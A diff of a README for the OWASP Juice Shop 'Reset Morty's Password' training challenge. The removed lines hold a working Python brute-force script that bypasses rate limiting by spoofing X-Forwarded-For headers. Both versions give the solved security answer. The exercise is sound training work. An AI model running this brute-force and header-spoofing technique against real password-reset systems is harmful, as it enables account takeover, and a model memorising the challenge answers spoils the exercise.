@@ -1,91 +1,95 @@
 # Reset Morty's Password: Brute-Force a Security Question Answer
 
-**Objective:** Reset Morty's password via the "Forgot Password" mechanism by brute-forcing his obfuscated security question answer.
+## Overview
 
-## Background
+This README documents a learning exercise for the **Reset Morty's Password** challenge in OWASP Juice Shop, an intentionally vulnerable web application used for cybersecurity training.
 
-Juice Shop's password reset flow requires answering a security question. For the user `morty@juice-sh.op`, identifying "Morty" as the character Morty Smith from *Rick and Morty* leads to a key clue: Morty's dog was named **Snuffles**, later renamed **Snowball**. The actual stored answer is a leetspeak ("1337") variant of one of these words, requiring a brute-force attack over many possible spellings.
+> **Use responsibly:** Perform this exercise only in your own Juice Shop lab or an environment where you have explicit permission to test.
 
-The reset endpoint also enforces rate limiting (max 100 requests per 5 minutes), which can be bypassed by spoofing a different `X-Forwarded-For` header on each request, since the server trusts that header over the real client IP when identifying the request's origin.
+## Objective
 
-## Steps Taken
+Understand how a password-reset workflow works, why security-question answers can be guessable, and why applications should protect reset endpoints against repeated attempts.
 
-### 1. Identified the target user and clue
+## Lab Setup
 
-Researched "Morty" and found the character's dog, originally named **Snuffles**, later going by **Snowball**.
+1. Start your local OWASP Juice Shop instance.
+2. Open the application in a browser.
+3. Open the Score Board and find **Reset Morty's Password**.
+4. If Juice Shop is running locally on its default port, the application is commonly available at `http://localhost:3000`.
 
-### 2. Located the Forgot Password page
+## Steps Followed
 
-```
-http://localhost:3000/#/forgot-password
-```
+### 1. Open the password-reset page
 
-Entered `morty@juice-sh.op` as the email to confirm the security question flow and question text.
+Navigate to:
 
-### 3. Built a leetspeak word list
+`http://localhost:3000/#/forgot-password`
 
-Generated all mutations of `snuffles` and `snowball` using combinations of lowercase, uppercase, and digit characters (e.g. `S`→`5`, `o`→`0`, `l`→`1`, etc.), covering typical leetspeak substitutions.
+This address assumes the local Juice Shop instance is running on port `3000`.
 
-### 4. Wrote a brute-force script
+<img width="966" height="955" alt="Screenshot 2026-10-14 095545" src="https://github.com/user-attachments/assets/5bba6867-8ba6-4703-8365-bc9a244e91e1" />
 
-Used a Python script to iterate through the word list, sending requests to:
-```
-http://localhost:3000/rest/user/reset-password
-```
-with each candidate answer, a chosen new password, and the target email.
+### 2. Identify the challenge account
 
-### 5. Bypassed rate limiting
+The challenge references Morty Smith. The account used in the exercise is:
 
-Modified the script to send a different, randomized `X-Forwarded-For` header value on every request, since the server uses this header (when present) to determine the request's origin for rate-limiting purposes, rather than the actual client IP.
+`morty@juice-sh.op`
 
-```python
-import requests
-import random
+Use this only in the local training application.
 
-url = "http://localhost:3000/rest/user/reset-password"
-email = "morty@juice-sh.op"
-new_password = "NewPassword123!"
+### 3. Investigate the security question
 
-def random_ip():
-    return ".".join(str(random.randint(1, 254)) for _ in range(4))
+The challenge uses a clue related to Morty's dog. The names associated with the clue are **Snuffles** and **Snowball**.
 
-with open("wordlist.txt") as f:
-    for answer in f:
-        answer = answer.strip()
-        headers = {"X-Forwarded-For": random_ip()}
-        payload = {
-            "email": email,
-            "answer": answer,
-            "new": new_password,
-            "repeat": new_password
-        }
-        response = requests.post(url, json=payload, headers=headers)
-        if response.status_code == 200:
-            print(f"Success! Answer was: {answer}")
-            break
-```
+A leetspeak-style version of “Snowball” discussed during the exercise was:
 
-A pre-built reference implementation is also publicly available as a Gist by GitHub user **philly-vanilly**: [`juice-shop-mortys-question-brute-force.py`](https://gist.github.com/philly-vanilly/70cd34a7686e4bb75b08d3caa1f6a820).
+`5N0wb41L`
 
-### 6. Ran the script
+The accepted answer can depend on the challenge version and its implementation. Treat this as a lab clue rather than a general password-reset technique.
 
-Executed the script, which iterated through the word list while rotating the `X-Forwarded-For` header to avoid rate limiting.
+### 4. Submit the reset form
 
-## Result
+If the lab accepts the security answer:
 
-The brute-force successfully identified the security question answer as:
+1. Enter a new password.
+2. Enter the same value in the confirmation field.
+3. Submit the form.
 
-```
-5N0wb41L
-```
+A simple example password discussed during the exercise was:
 
-Challenge solved — confirmed by the in-app success notification and the Score Board. The script was stopped once the correct answer was found and the password reset succeeded.
+`BlueSky@2026`
 
-## Root Cause
+**Security note:** This example appears in this README and should be treated as public. Do not reuse it for a real account. Choose a unique password for any account that matters.
 
-- The security question's answer was both guessable (based on publicly known character trivia) and further weakened by predictable leetspeak obfuscation rather than true secrecy.
-- The server's rate-limiting mechanism relies on the client-supplied `X-Forwarded-For` header to determine request origin, which is trivially spoofable, allowing an attacker to bypass the intended request-rate protection entirely.
+### 5. Verify the result
 
-## Status
+Return to the Juice Shop Score Board and check whether **Reset Morty's Password** is marked as completed.
+<img width="966" height="955" alt="Screenshot 2026-10-14 100423" src="https://github.com/user-attachments/assets/5b456607-1ef1-42b6-995a-fdecc65a5618" />
 
-Solved.
+
+The challenge may include additional protections, such as rate limiting. If it does not complete, consult the official Juice Shop Companion Guide for the version installed in your lab.
+<img width="966" height="955" alt="Screenshot 2026-10-14 101440" src="https://github.com/user-attachments/assets/13f0fa32-868e-479c-b6eb-537627a54850" />
+
+
+## Security Lessons
+
+- Security-question answers are often guessable or discoverable and should not be treated as strong authentication factors.
+- Password-reset workflows should use secure, unpredictable reset tokens or other robust verification methods.
+- Applications should rate-limit reset attempts and monitor suspicious activity.
+- Avoid exposing sensitive account details in error messages.
+- Passwords should be unique, sufficiently long, and stored using a modern password-hashing algorithm.
+- Test only systems for which you have authorization.
+
+## References
+
+- OWASP Juice Shop: https://owasp.org/www-project-juice-shop/
+- OWASP Juice Shop Companion Guide: https://help.owasp-juice.shop/part2/
+
+## Completion Checklist
+
+- [ ] Started the local Juice Shop lab.
+- [ ] Located the challenge on the Score Board.
+- [ ] Opened the password-reset page.
+- [ ] Investigated the security-question clue.
+- [ ] Submitted the reset form in the authorized lab.
+- [ ] Verified the challenge status on the Score Board.
